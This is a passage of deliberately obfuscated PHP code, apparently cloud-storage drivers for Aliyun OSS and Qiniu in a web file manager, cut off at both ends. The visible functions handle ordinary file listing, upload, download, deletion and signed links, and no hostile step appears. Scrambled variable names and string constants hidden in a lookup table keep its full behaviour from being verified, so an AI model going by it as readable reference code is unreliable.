3600 * 12, $ğ³Ù‚ñ[261], $ñö›¦ÛÉ); return $this->getCdnLink($œÆÃø°­); } catch (OSS\Core\OssException $´ÙÍ¹×§) { $this->writeLog(__FUNCTION__ . $ğ³Ù‚ñ[214] . $´ÙÍ¹×§->getMessage()); return !1; } } public function fileOut($Ñ­«ìŠ¸, $´À »Ó = false, $¦™Õ¸»ï = false, $”É×»ïµ = '') { $¼ÛÑô¤ã =& $_SERVER[¢ñàß¿€]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ñ­«ìŠ¸, $´À »Ó, $¦™Õ¸»ï, $”É×»ïµ); } if (!$¦™Õ¸»ï) { $¦™Õ¸»ï = $this->pathThis($Ñ­«ìŠ¸); } $¦™Õ¸»ï = rawurlencode($¦™Õ¸»ï); $³ÆË›ˆ‹ = get_file_mime(get_path_ext($¦™Õ¸»ï)); if ($³ÆË›ˆ‹ == $¼ÛÑô¤ã[248]) { return parent::fileOut($Ñ­«ìŠ¸, $´À »Ó, $¦™Õ¸»ï, $”É×»ïµ); } $´À »Ó = $´À »Ó ? $¼ÛÑô¤ã[1493] : $¼ÛÑô¤ã[1494]; $Ìßì²Ñ¸ = array(OSS\OssClient::OSS_SUB_RESOURCE => $¼ÛÑô¤ã[1495] . rawurlencode("{$´À »Ó}\x3b\146\x69\154\x65\156\x61\155\x65\75{$¦™Õ¸»ï}")); $Ìßì²Ñ¸[OSS\OssClient::OSS_SUB_RESOURCE] .= $¼ÛÑô¤ã[1496] . rawurlencode($³ÆË›ˆ‹); $áàÜµ­ = $this->link($Ñ­«ìŠ¸, $Ìßì²Ñ¸); $this->fileOutLink($áàÜµ­); } public function fileOutServer($àâ™Êä, $ıŒÒåÅ = false, $õ©§Ì€ì = false, $şÜÜ„¦ = '') { parent::fileOut($àâ™Êä, $ıŒÒåÅ, $õ©§Ì€ì, $şÜÜ„¦); } public function fileOutImage($ğß§ç÷Ì, $‰ëï­ÎØ = 250) { if ($this->size($ğß§ç÷Ì) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ğß§ç÷Ì, $‰ëï­ÎØ); } $´™¿ç©Ÿ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¢ñàß¿€][1455] . $‰ëï­ÎØ); $´½¶È°ê = $this->link($ğß§ç÷Ì, $´™¿ç©Ÿ); $this->fileOutLink($´½¶È°ê); } public function fileOutImageServer($£ÍéÒı, $ãİØº’ = 250) { parent::fileOutImage($£ÍéÒı, $ãİØº’); } public function fileOutLink($ïœÕñ½û) { $¾œÀÈÍ =& $_SERVER[¢ñàß¿€]; if (!$this->isCdnHost() && substr($ïœÕñ½û, 0, 7) == $¾œÀÈÍ[313]) { $ïœÕñ½û = $¾œÀÈÍ[314] . substr($ïœÕñ½û, 7); } header($¾œÀÈÍ[175] . $ïœÕñ½û); die; } public function hashMd5($“ìàØ¨À, $èïÇû = '') { $×ÄĞ¯…… =& $_SERVER[¢ñàß¿€]; $ÛØ™ÅÊ  = $this->_objectMeta($“ìàØ¨À); if (!$ÛØ™ÅÊ ) { return $×ÄĞ¯……[12]; } if (!isset($ÛØ™ÅÊ [$×ÄĞ¯……[1477]]) && !empty($èïÇû)) { $’öìûŒ = $this->updateObjMeta($“ìàØ¨À, array($×ÄĞ¯……[1477] => $èïÇû)); $ÛØ™ÅÊ [$×ÄĞ¯……[1477]] = $’öìûŒ ? $èïÇû : $×ÄĞ¯……[12]; } return isset($ÛØ™ÅÊ [$×ÄĞ¯……[1477]]) ? strtolower($ÛØ™ÅÊ [$×ÄĞ¯……[1477]]) : $×ÄĞ¯……[12]; } public function size($ÁßÄÙ–¹) { $¼Ñ¿Èâ¯ = $this->objectMeta($ÁßÄÙ–¹); return $¼Ñ¿Èâ¯ ? $¼Ñ¿Èâ¯[$_SERVER[¢ñàß¿€][79]] : 0; } public function info($¿ã•´Ú¾) { if ($this->isFolder($¿ã•´Ú¾)) { return $this->folderInfo($¿ã•´Ú¾); } else { if ($this->isFile($¿ã•´Ú¾)) { return $this->fileInfo($¿ã•´Ú¾); } } return !1; } public function exist($«´’ı) { return $this->isFile($«´’ı) || $this->isFolder($«´’ı); } public function isFile($µ¿ÉÙ÷) { return !$this->isFolder($µ¿ÉÙ÷) && $this->objectMeta($µ¿ÉÙ÷); } public function isFolder($§æàî·¦) { return $this->cacheMethod($_SERVER[¢ñàß¿€][179], $§æàî·¦); } protected function objectMeta($¥â¦ÙıÌ) { return $this->cacheMethod($_SERVER[¢ñàß¿€][181], $¥â¦ÙıÌ); } protected function _objectMeta($Æ¦Ø¾ÓÅ) { $ùüä¼Ö =& $_SERVER[¢ñàß¿€]; try { $Ş ÍË† = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Æ¦Ø¾ÓÅ)); } catch (OSS\Core\OssException $üĞÖ”ò) { $this->writeLog(__FUNCTION__ . $ùüä¼Ö[214] . $üĞÖ”ò->getMessage()); $Ş ÍË† = !1; } if ($Ş ÍË†) { $Ş ÍË†[$ùüä¼Ö[79]] = intval($Ş ÍË†[$ùüä¼Ö[1475]]); } return $Ş ÍË†; } protected function _isFolder($ì’ìˆÄè) { $ª£²Å›ó =& $_SERVER[¢ñàß¿€]; if ($ì’ìˆÄè == $ª£²Å›ó[12] || $ì’ìˆÄè == $ª£²Å›ó[8]) { return !0; } $µ¬óÜï® = array($ª£²Å›ó[1470] => $ª£²Å›ó[8], $ª£²Å›ó[1471] => rtrim($ì’ìˆÄè, $ª£²Å›ó[8]) . $ª£²Å›ó[8], $ª£²Å›ó[1472] => 1, $ª£²Å›ó[1473] => $ª£²Å›ó[12]); $©£«™¯ò = $this->client->listObjects($this->bucket, $µ¬óÜï®); if ($©£«™¯ò->getObjectList() || $©£«™¯ò->getPrefixList()) { return !0; } return !1; } public function writeLog($ßˆªâÔ½ = '', $•¿Éó± = false) { $›ÆèŠ‚· =& $_SERVER[¢ñàß¿€]; $Šœ«ˆüæ = in_array(ACTION, array($›ÆèŠ‚·[212], $›ÆèŠ‚·[213])); if (!$Šœ«ˆüæ && !GLOBAL_DEBUG) { return; } $ĞŠ½•şµ = 0; if (stripos($ßˆªâÔ½, $›ÆèŠ‚·[1497]) !== !1) { $ĞŠ½•şµ = 1; $Œºî‘¨Ì = explode($›ÆèŠ‚·[1498], $ßˆªâÔ½); $ßˆªâÔ½ = !empty($Œºî‘¨Ì[1]) ? $Œºî‘¨Ì[1] : $ßˆªâÔ½; } else { if (stripos($ßˆªâÔ½, $›ÆèŠ‚·[1499])) { $ĞŠ½•şµ = 2; $Œºî‘¨Ì = explode($›ÆèŠ‚·[1499], $ßˆªâÔ½); $Œºî‘¨Ì = explode($›ÆèŠ‚·[4], $Œºî‘¨Ì[0]); $ßˆªâÔ½ = !empty($Œºî‘¨Ì[1]) ? $Œºî‘¨Ì[1] : $ßˆªâÔ½; } } if ($Šœ«ˆüæ && I18n::getType() == $›ÆèŠ‚·[1500]) { if ($ĞŠ½•şµ == 1) { $ßˆªâÔ½ = str_replace($›ÆèŠ‚·[1501], $›ÆèŠ‚·[1502], $ßˆªâÔ½); } else { if ($ĞŠ½•şµ == 2) { $Œºî‘¨Ì = explode($›ÆèŠ‚·[214], $Œºî‘¨Ì[0]); $×Ù£èÈÁ = isset($Œºî‘¨Ì[1]) ? $Œºî‘¨Ì[1] : $›ÆèŠ‚·[12]; $•±í»Ù = array($›ÆèŠ‚·[1503] => $›ÆèŠ‚·[1504], $›ÆèŠ‚·[1505] => $›ÆèŠ‚·[1506], $›ÆèŠ‚·[1507] => $›ÆèŠ‚·[1508], $›ÆèŠ‚·[1509] => $›ÆèŠ‚·[1510], $›ÆèŠ‚·[1511] => $›ÆèŠ‚·[1512], $›ÆèŠ‚·[1513] => $›ÆèŠ‚·[1514], $›ÆèŠ‚·[1515] => $›ÆèŠ‚·[1516], $›ÆèŠ‚·[1517] => $›ÆèŠ‚·[1518], $›ÆèŠ‚·[1519] => $›ÆèŠ‚·[1520], $›ÆèŠ‚·[1521] => $›ÆèŠ‚·[1522]); if (isset($•±í»Ù[$×Ù£èÈÁ])) { $ßˆªâÔ½ = $•±í»Ù[$×Ù£èÈÁ]; } } } if (stripos($ßˆªâÔ½, $›ÆèŠ‚·[1523])) { $ßˆªâÔ½ = $›ÆèŠ‚·[1524]; } } if (!trim($ßˆªâÔ½)) { return; } parent::writeLog(trim($ßˆªâÔ½), $•¿Éó±); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($†”ÖÜó) { parent::__construct(); require_once SDK_DIR . $_SERVER[¢ñàß¿€][1525]; $this->_init($†”ÖÜó); } public function _init($‹Ï´ÈÉ) { $ÆÊš©ËÖ =& $_SERVER[¢ñàß¿€]; $this->config = $‹Ï´ÈÉ; foreach ($‹Ï´ÈÉ as $×»ß· => $íüÁÜÏË) { if (isset($this->{$×»ß·})) { $this->{$×»ß·} = $íüÁÜÏË; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÆÊš©ËÖ[1526] . LNG($ÆÊš©ËÖ[1461])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Ÿ„íó´Î, $É—¡Ÿ¹º = '', $‚‡»ü—Û = REPEAT_RENAME) { if ($this->setContent($Ÿ„íó´Î, $É—¡Ÿ¹º)) { return $this->getPathOuter($Ÿ„íó´Î); } return !1; } public function mkdir($®èí, $ñÎş‡¿î = REPEAT_SKIP) { $–‹ş¼÷­ =& $_SERVER[¢ñàß¿€]; $Õ…ë›¦ = trim($®èí, $–‹ş¼÷­[8]); if ($this->_isFolder($Õ…ë›¦)) { return $this->getPathOuter($Õ…ë›¦); } $®èí = $Õ…ë›¦ . $–‹ş¼÷­[8]; $ŸƒĞäßà = get_path_this($Õ…ë›¦); $Ñ¬«¸­ª = $®èí . $ŸƒĞäßà; if (!$this->mkfile($Ñ¬«¸­ª)) { return !1; } if (!$this->moveFile($Ñ¬«¸­ª, $®èí)) { $this->delFile($Ñ¬«¸­ª); return !1; } return $this->getPathOuter($Õ…ë›¦); } public function copyFile($è³ïèöÇ, $ïç´”ó´) { $î‰ØµÕ² = $this->bucketManager->copy($this->bucket, $è³ïèöÇ, $this->bucket, $ïç´”ó´, !0); return $î‰ØµÕ² ? !1 : $this->getPathOuter($ïç´”ó´); } public function moveFile($­ğ¥¶ëŸ, $£é½Õˆ) { $™Ş®Ò‡˜ = $this->bucketManager->move($this->bucket, $­ğ¥¶ëŸ, $this->bucket, $£é½Õˆ, !0); return $™Ş®Ò‡˜ ? !1 : $this->getPathOuter($£é½Õˆ); } public function delFile($êë¡ÕÆ) { if (!$this->exist($êë¡ÕÆ)) { return !0; } $×áØµ±Ø = $this->bucketManager->delete($this->bucket, $êë¡ÕÆ); return $×áØµ±Ø ? !1 : !0; } public function delFolder($À §ôŠı) { $òÌ•±ù‘ =& $_SERVER[¢ñàß¿€]; if (!$this->exist($À §ôŠı)) { return !0; } $this->listItemCache = !1; $³†ß¸ı‘ = $this->fileList($À §ôŠı); $this->listItemCache = !0; $ÁØ‰œ = trim($À §ôŠı, $òÌ•±ù‘[8]) . $òÌ•±ù‘[8]; if (!empty($À §ôŠı) && $À §ôŠı !== $òÌ•±ù‘[228] && !in_array($ÁØ‰œ, $³†ß¸ı‘[$òÌ•±ù‘[85]])) { $³†ß¸ı‘[$òÌ•±ù‘[85]][] = $ÁØ‰œ; } $«Ñ¦€÷ = $this->delByBatch($³†ß¸ı‘[$òÌ•±ù‘[86]]); if (!$«Ñ¦€÷) { return !1; } $«Ñ¦€÷ = $this->delByBatch($³†ß¸ı‘[$òÌ•±ù‘[85]]); if (!$«Ñ¦€÷) { return !1; } return $this->delFile($ÁØ‰œ); } private function delByBatch($ìÛÈÂˆ) { foreach (array_chunk($ìÛÈÂˆ, 1000) as $‘øÍŸ’Â) { $ÃÄ‹Ş€œ = $this->bucketManager->buildBatchDelete($this->bucket, $‘øÍŸ’Â); list($ÃÏº…¨Ï, $ùÂæøï) = $this->bucketManager->batch($ÃÄ‹Ş€œ); if ($ùÂæøï) { return !1; } } return !0; } public function rename($Ã¦¾ô‡İ, $áÚº´ó) { return $this->renameObject($Ã¦¾ô‡İ, $áÚº´ó); } public function fileInfo($Ê–üŸ¦¡, $ğ´ã›« = false, $ÜøÚçóà = array()) { $„ş¥·Öş =& $_SERVER[¢ñàß¿€]; $‘ğ†×û– = array($„ş¥·Öş[32] => $this->pathThis($Ê–üŸ¦¡), $„ş¥·Öş[87] => $this->getPathOuter($„ş¥·Öş[8] . $Ê–üŸ¦¡), $„ş¥·Öş[33] => $„ş¥·Öş[230], $„ş¥·Öş[79] => isset($ÜøÚçóà[$„ş¥·Öş[1527]]) ? $ÜøÚçóà[$„ş¥·Öş[1527]] : 0, $„ş¥·Öş[169] => $this->ext($Ê–üŸ¦¡)); if ($ğ´ã›«) { return $‘ğ†×û–; } $‘ğ†×û–[$„ş¥·Öş[231]] = $‘ğ†×û–[$„ş¥·Öş[88]] = 0; $‘ğ†×û–[$„ş¥·Öş[232]] = $‘ğ†×û–[$„ş¥·Öş[233]] = !0; if (empty($ÜøÚçóà)) { $ÜøÚçóà = $this->objectMeta($Ê–üŸ¦¡); if (!$ÜøÚçóà) { return $‘ğ†×û–; } } if (isset($ÜøÚçóà[$„ş¥·Öş[234]]) && $ÜøÚçóà[$„ş¥·Öş[234]]) { $‘ğ†×û–[$„ş¥·Öş[235]] = $ÜøÚçóà[$„ş¥·Öş[234]]; } if (isset($ÜøÚçóà[$„ş¥·Öş[245]]) && $ÜøÚçóà[$„ş¥·Öş[245]]) { $‘ğ†×û–[$„ş¥·Öş[235]] = $ÜøÚçóà[$„ş¥·Öş[245]]; } if (isset($ÜøÚçóà[$„ş¥·Öş[1528]])) { $‘ğ†×û–[$„ş¥·Öş[88]] = substr($ÜøÚçóà[$„ş¥·Öş[1528]] . $„ş¥·Öş[12], 0, 10); } if (isset($ÜøÚçóà[$„ş¥·Öş[1527]])) { $‘ğ†×û–[$„ş¥·Öş[79]] = $ÜøÚçóà[$„ş¥·Öş[1527]]; } return $‘ğ†×û–; } public function folderInfo($ÛÉ¸‹±æ, $ğÂÑÛîË = false) { $¶Š¾óÒÜ =& $_SERVER[¢ñàß¿€]; $¥øÔÅƒ™ = array($¶Š¾óÒÜ[32] => $this->pathThis($ÛÉ¸‹±æ), $¶Š¾óÒÜ[87] => $this->getPathOuter($¶Š¾óÒÜ[8] . $ÛÉ¸‹±æ), $¶Š¾óÒÜ[33] => $¶Š¾óÒÜ[78]); if ($ğÂÑÛîË) { return $¥øÔÅƒ™; } $¥øÔÅƒ™[$¶Š¾óÒÜ[231]] = $¥øÔÅƒ™[$¶Š¾óÒÜ[88]] = 0; $¥øÔÅƒ™[$¶Š¾óÒÜ[232]] = $¥øÔÅƒ™[$¶Š¾óÒÜ[233]] = !0; $ÛÉ¸‹±æ = rtrim($ÛÉ¸‹±æ, $¶Š¾óÒÜ[8]) . $¶Š¾óÒÜ[8]; $Ê¾ô¸ı = $this->objectMeta($ÛÉ¸‹±æ); if (isset($Ê¾ô¸ı[$¶Š¾óÒÜ[1528]])) { $¥øÔÅƒ™[$¶Š¾óÒÜ[88]] = substr($Ê¾ô¸ı[$¶Š¾óÒÜ[1528]] . $¶Š¾óÒÜ[12], 0, 10); } return $¥øÔÅƒ™; } public function listPath($â´ÜŞÏŸ, $µÉó‚ü = false) { $¾Ã‰İ•‰ =& $_SERVER[¢ñàß¿€]; $…Æœ’Ä÷ = $this->fileList($â´ÜŞÏŸ, $¾Ã‰İ•‰[8], !0); foreach ($…Æœ’Ä÷[$¾Ã‰İ•‰[85]] as $Á±Ùœß« => $ú˜‘Ø„ñ) { $…Æœ’Ä÷[$¾Ã‰İ•‰[85]][$Á±Ùœß«] = $this->folderInfo($ú˜‘Ø„ñ, $µÉó‚ü); } foreach ($…Æœ’Ä÷[$¾Ã‰İ•‰[86]] as $Á±Ùœß« => $ú˜‘Ø„ñ) { $…Æœ’Ä÷[$¾Ã‰İ•‰[86]][$Á±Ùœß«] = $this->fileInfo($ú˜‘Ø„ñ[$¾Ã‰İ•‰[97]], $µÉó‚ü, $ú˜‘Ø„ñ); } return $…Æœ’Ä÷; } public function has($°¼¶Õî, $šš€‚° = false, $»·»˜ãØ = true) { $Ëë³œÃ— =& $_SERVER[¢ñàß¿€]; $°¼¶Õî = trim($°¼¶Õî, $Ëë³œÃ—[8]); $¥ŒÅôØ = empty($°¼¶Õî) && $°¼¶Õî !== $Ëë³œÃ—[228] ? $Ëë³œÃ—[12] : $°¼¶Õî . $Ëë³œÃ—[8]; $¦µ¡—¦ø = $Ëë³œÃ—[12]; $Åß® ÅÎ = 500; $Ù¾¡ô” = $Ëë³œÃ—[8]; $»¢ººÊ = $ò‘ÏÇæ’ = 0; while (!0) { check_abort(); list($ê½ğ¨×û, $ùÓ—ûš) = $this->bucketManager->listFiles($this->bucket, $¥ŒÅôØ, $¦µ¡—¦ø, $Åß® ÅÎ, $Ù¾¡ô”); if ($ùÓ—ûš) { break; } $¦µ¡—¦ø = array_key_exists($Ëë³œÃ—[1473], $ê½ğ¨×û) ? $¦µ¡—¦ø = $ê½ğ¨×û[$Ëë³œÃ—[1529]] : $Ëë³œÃ—[12]; if ($šš€‚°) { if (!empty($ê½ğ¨×û[$Ëë³œÃ—[1530]])) { $»¢ººÊ += count($ê½ğ¨×û[$Ëë³œÃ—[1530]]); } if (!empty($ê½ğ¨×û[$Ëë³œÃ—[1531]])) { $ò‘ÏÇæ’ += count($ê½ğ¨×û[$Ëë³œÃ—[1531]]); } if ($¦µ¡—¦ø === $Ëë³œÃ—[12]) { break; } continue; } if ($»·»˜ãØ) { if (!empty($ê½ğ¨×û[$Ëë³œÃ—[1530]])) { return !0; } } else { if (!empty($ê½ğ¨×û[$Ëë³œÃ—[1531]])) { return !0; } } if ($¦µ¡—¦ø === $Ëë³œÃ—[12]) { break; } } if ($šš€‚°) { return array($Ëë³œÃ—[239] => $»¢ººÊ, $Ëë³œÃ—[240] => $ò‘ÏÇæ’); } return !1; } public function listAll($øáÙ£¶ş) { $Á½Ãšä‘ =& $_SERVER[¢ñàß¿€]; $È„÷ËùŸ = $this->fileList($øáÙ£¶ş, $Á½Ãšä‘[12], !0); $‡€áóÁÂ = array_to_keyvalue($È„÷ËùŸ[$Á½Ãšä‘[86]], $Á½Ãšä‘[32]); foreach ($È„÷ËùŸ[$Á½Ãšä‘[85]] as $ÁÍ¢¿¬€) { if (is_string($ÁÍ¢¿¬€)) { $‡€áóÁÂ[$ÁÍ¢¿¬€] = array($Á½Ãšä‘[79] => 0); } } return $this->listAllFiles($øáÙ£¶ş, $‡€áóÁÂ); } private function fileList($îºÈò­Ç, $Üß¿ê•á = '', $ÉÔ´¤Ã = 0) { $ÉİÂˆ¼³ =& $_SERVER[¢ñàß¿€]; $îºÈò­Ç = trim($îºÈò­Ç, $ÉİÂˆ¼³[8]); $«Ù¨ß« = empty($îºÈò­Ç) && $îºÈò­Ç !== $ÉİÂˆ¼³[228] ? $ÉİÂˆ¼³[12] : $îºÈò­Ç . $ÉİÂˆ¼³[8]; $´™ÓÚÇƒ = $ÉİÂˆ¼³[12]; $Ÿç¸‹ú¥ = 1000; $Ç¥âìó¦ = $ß£ùÛ = array(); while (!0) { check_abort(); list($ê¯¥¢İË, $®¨¹£¾í) = $this->bucketManager->listFiles($this->bucket, $«Ù¨ß«, $´™ÓÚÇƒ, $Ÿç¸‹ú¥, $Üß¿ê•á); if ($®¨¹£¾í) { break; } $´™ÓÚÇƒ = array_key_exists($ÉİÂˆ¼³[1473], $ê¯¥¢İË) ? $´™ÓÚÇƒ = $ê¯¥¢İË[$ÉİÂˆ¼³[1529]] : $ÉİÂˆ¼³[12]; $ÙŠì£ˆÛ = isset($ê¯¥¢İË[$ÉİÂˆ¼³[1530]]) ? $ê¯¥¢İË[$ÉİÂˆ¼³[1530]] : array(); $Ê¹»–È¿ = isset($ê¯¥¢İË[$ÉİÂˆ¼³[1531]]) ? $ê¯¥¢İË[$ÉİÂˆ¼³[1531]] : array(); foreach ($ÙŠì£ˆÛ as $³ÖşÜÆ) { if ($³ÖşÜÆ[$ÉİÂˆ¼³[97]] == $«Ù¨ß«) { continue; } $è“äÈ±õ = $³ÖşÜÆ[$ÉİÂˆ¼³[97]]; $Ê ×­ƒ¢ = $³ÖşÜÆ[$ÉİÂˆ¼³[1527]]; $³ÖşÜÆ[$ÉİÂˆ¼³[79]] = $Ê ×­ƒ¢; $ƒã„ğâÃ = $Ê ×­ƒ¢ == 0 && substr($è“äÈ±õ, strlen($è“äÈ±õ) - 1, 1) == $ÉİÂˆ¼³[8] ? !0 : !1; $this->cacheMethodInfoSet($è“äÈ±õ, $ƒã„ğâÃ, $³ÖşÜÆ); if ($ƒã„ğâÃ) { $Ç¥âìó¦[] = $è“äÈ±õ; continue; } $ß£ùÛ[] = $ÉÔ´¤Ã ? $³ÖşÜÆ : $è“äÈ±õ; } foreach ($Ê¹»–È¿ as $è“äÈ±õ) { if ($è“äÈ±õ == $«Ù¨ß«) { continue; } $Ç¥âìó¦[] = $è“äÈ±õ; $this->cacheMethodInfoSet($è“äÈ±õ, !0); } if ($´™ÓÚÇƒ === $ÉİÂˆ¼³[12]) { break; } } $this->cacheMethodInfoSet($îºÈò­Ç, !0); return array($ÉİÂˆ¼³[85] => $Ç¥âìó¦, $ÉİÂˆ¼³[86] => $ß£ùÛ); } public function canRead($÷Å¬à’°) { return $this->exist($÷Å¬à’°) ? !0 : !1; } public function canWrite($ğşÑ·‰…) { return $this->exist($ğşÑ·‰…) ? !0 : !1; } public function getContent($‘Ö³ÅÆ“) { return $this->fileSubstr($‘Ö³ÅÆ“, 0, -1); } public function setContent($ı»ìä©„, $Ÿ™ÎÀó = '') { $¢ŒÎôÊÒ = $this->tempFile($this->pathThis($ı»ìä©„)); file_put_contents($¢ŒÎôÊÒ, $Ÿ™ÎÀó); if ($this->upload($ı»ìä©„, $¢ŒÎôÊÒ)) { $this->tempFileRemve($¢ŒÎôÊÒ); return !0; } return !1; } public function refreshUrls($ú¯À¸»Õ) { $Æ ™™í  =& $_SERVER[¢ñàß¿€]; $ÜÙëÑøÁ = array(); if (is_array($ú¯À¸»Õ)) { foreach ($ú¯À¸»Õ as $óÖôÌ£‰) { $ÜÙëÑøÁ[] = $this->link($óÖôÌ£‰); } } else { $ÜÙëÑøÁ[] = $this->link($ú¯À¸»Õ); } $ğÌ¨‘¿¡ = new Qiniu\Cdn\CdnManager($this->auth); list($İÎ×öÕ¬, $Ÿ±ÑÉ—ñ) = $ğÌ¨‘¿¡->refreshUrls($ÜÙëÑøÁ); if ($Ÿ±ÑÉ—ñ) { return !1; } return $İÎ×öÕ¬[$Æ ™™í [1261]] == $Æ ™™í [830] ? !0 : !1; } public function fileSubstr($ÚòÏ†», $ıËşå×, $ÜÃ†–Áª) { $Õ‡Áõ°­ =& $_SERVER[¢ñàß¿€]; if (!($ñêÛÄó˜ = $this->link($ÚòÏ†»))) { return !1; } $Ô’½ÄèÑ = !1; if ($ÜÃ†–Áª > 0) { $ùäÜ÷ê÷ = $ıËşå× + $ÜÃ†–Áª - 1; $Ô’½ÄèÑ = array($Õ‡Áõ°­[1532] . $ıËşå× . $Õ‡Áõ°­[462] . $ùäÜ÷ê÷); } $ÑÊú¨ÙÓ = url_request($ñêÛÄó˜, $Õ‡Áõ°­[261], !1, $Ô’½ÄèÑ); return $ÑÊú¨ÙÓ[$Õ‡Áõ°­[821]] ? $ÑÊú¨ÙÓ[$Õ‡Áõ°­[1284]] : !1; } public function upload($„¢ƒÅ¶, $ıã¼îĞÎ, $Û©Àê› = false, $ü…ó·¶ü = REPEAT_REPLACE) { $®¬Û›ææ = new Qiniu\Storage\UploadManager(); $‘¹¬­¹ù = $this->auth->uploadToken($this->bucket, $„¢ƒÅ¶); $çÜö»¼ = get_file_mime(get_path_ext($ıã¼îĞÎ)); list($ÒÂòœ¬¹, $®¦¤·ø£) = $®¬Û›ææ->putFile($‘¹¬­¹ù, $„¢ƒÅ¶, $ıã¼îĞÎ, null, $çÜö»¼); return $®¦¤·ø£ ? !1 : $this->getPathOuter($„¢ƒÅ¶); } public function uploadFormData($Ä“·ûş, $Ö¾¡Ÿ¶• = 3600) { return $this->uploadToken($Ä“·ûş, $Ö¾¡Ÿ¶•); } public function multiUploadFormData($õ¢èú¬Ê, $²Ø·‹å– = 3600) { return $this->uploadToken($õ¢èú¬Ê, $²Ø·‹å–); } private function uploadToken($ñÜ’¥¢®, $§¸»¶½¢ = 3600) { $ÄóåÄ´­ =& $_SERVER[¢ñàß¿€]; $–‰‡Æëü = $§¸»¶½¢; $Ñˆ€™Êì = array($ÄóåÄ´­[1533] => $ÄóåÄ´­[1534]); $ª«Šğø = $ñÜ’¥¢®; $‘œô–§ = $this->auth->uploadToken($this->bucket, $ª«Šğø, $–‰‡Æëü, $Ñˆ€™Êì, !0); $™¿¼Ã÷º = empty($this->region) || $this->region == $ÄóåÄ´­[1535] ? $ÄóåÄ´­[12] : $ÄóåÄ´­[462] . $this->region; $ÖÒµ¸‹ = http_type() . "\x3a\57\57\165\x70\154\157\x61\144{$™¿¼Ã÷º}\56\x71\x69\x6e\151\x75\160\x2e\143\157\155\x2f"; return array($ÄóåÄ´­[1536] => $‘œô–§, $ÄóåÄ´­[1537] => $ÖÒµ¸‹); } public function download($Ï øš’í, $À¥ğÎ¦©) { $Á˜¤‰Ğ¨ = IO::getPathInner(IO::mkfile($À¥ğÎ¦©)); if (!($ò²Š“şı = $this->link($Ï øš’í))) { return !1; } $ŒŠ…­“ = 0; $ºá¸Ëõ€ = 1024 * 200; $Ì¥×æº = fopen($Á˜¤‰Ğ¨, $_SERVER[¢ñàß¿€][1538]); while (!0) { $î¤°äœ¼ = $this->fileSubstr($Ï øš’í, $ŒŠ…­“, $ºá¸Ëõ€); if ($î¤°äœ¼ === !1) { return !1; } fwrite($Ì¥×æº, $î¤°äœ¼); $ŒŠ…­“ += $ºá¸Ëõ€; if (strlen($î¤°äœ¼) < $ºá¸Ëõ€) { break; } } fclose($Ì¥×æº); return $À¥ğÎ¦©; } public function link($€İé¨¸®, $í­üœÃ = '') { if (!$this->isFile($€İé¨¸®)) { return !1; } $ôİáŞê± = $this->getHost() . $_SERVER[¢ñàß¿€][8] . $this->pathEncode($€İé¨¸®) . $í­üœÃ; return $this->auth->privateDownloadUrl($ôİáŞê±, 3600 * 12); } public function fileOut($®À ñó·, $€€½›âà = false, $ã”½öÛÎ = false, $ª‹µ°‰ = '') { $“şØë˜Ñ =& $_SERVER[¢ñàß¿€]; if ($this->isFileOutServer()) { return $this->fileOutServer($®À ñó·, $€€½›âà, $ã”½öÛÎ, $ª‹µ°‰); } if (!$ã”½öÛÎ) { $ã”½öÛÎ = $this->pathThis($®À ñó·); } $µİ£ªâÅ = $€€½›âà ? $“şØë˜Ñ[1539] . rawurlencode($ã”½öÛÎ) : $“şØë˜Ñ[12]; $ú¨–üôÅ = $this->link($®À ñó·, $µİ£ªâÅ); $this->fileOutLink($ú¨–üôÅ); } public function fileOutServer($—Ğ¼¥áÌ, $•œ™¶•Ó = false, $âªîúÇš = false, $é™èª¢× = '') { parent::fileOut($—Ğ¼¥áÌ, $•œ™¶•Ó, $âªîúÇš, $é™èª¢×); } public function fileOutImage($±û¾á´¯, $ÊæËµÊş = 250) { if ($this->size($±û¾á´¯) > 1024 * 1024 * 20) { return $this->fileOutImageServer($±û¾á´¯, $ÊæËµÊş); } $‘Œš²Ô“ = $this->link($±û¾á´¯, $_SERVER[¢ñàß¿€][1540] . $ÊæËµÊş); $this->fileOutLink($‘Œš²Ô“); } public function fileOutImageServer($×–Ÿ“÷×, $Ä‘Ó¡÷– = 250) { parent::fileOutImage($×–Ÿ“÷×, $Ä‘Ó¡÷–); } public function hashMd5($ÇÍŸ¾ Ş) { $²åïËĞ =& $_SERVER[¢ñàß¿€]; $Ùì—ãáè = $this->objectMeta($ÇÍŸ¾ Ş); return isset($Ùì—ãáè[$²åïËĞ[245]]) ? $Ùì—ãáè[$²åïËĞ[245]] : !1; $¾¨ÍÒã€ = $this->link($ÇÍŸ¾ Ş, $²åïËĞ[1541]); } public function size($ŸØ‘ĞÈÔ) { $ŸÛ«û•ù = $this->objectMeta($ŸØ‘ĞÈÔ); return $ŸÛ«û•ù ? $ŸÛ«û•ù[$_SERVER[¢ñàß¿€][79]] : 0; } public function info($¨Ü…±¿¤) { if ($this->isFolder($¨Ü…±¿¤)) { return $this->folderInfo($¨Ü…±¿¤); } else { if ($this->isFile($¨Ü…±¿¤)) { return $this->fileInfo($¨Ü…±¿¤); } } return !1; } public function exist($óü˜ºÑù) { return $this->isFile($óü˜ºÑù) || $this->isFolder($óü˜ºÑù); } public function isFile($í¡ğ†ïÓ) { return !$this->isFolder($í¡ğ†ïÓ) && $this->objectMeta($í¡ğ†ïÓ); } public function isFolder($©Ü¼¯Ä‰) { return $this->cacheMethod($_SERVER[¢ñàß¿€][179], $©Ü¼¯Ä‰); } protected function objectMeta($öï ¸Ó÷) { return $this->cacheMethod($_SERVER[¢ñàß¿€][181], $öï ¸Ó÷); } protected function _objectMeta($¢ÃÅ¦ô·) { $şìœüÇ¦ =& $_SERVER[¢ñàß¿€]; list($Ìõ¿Š†î, 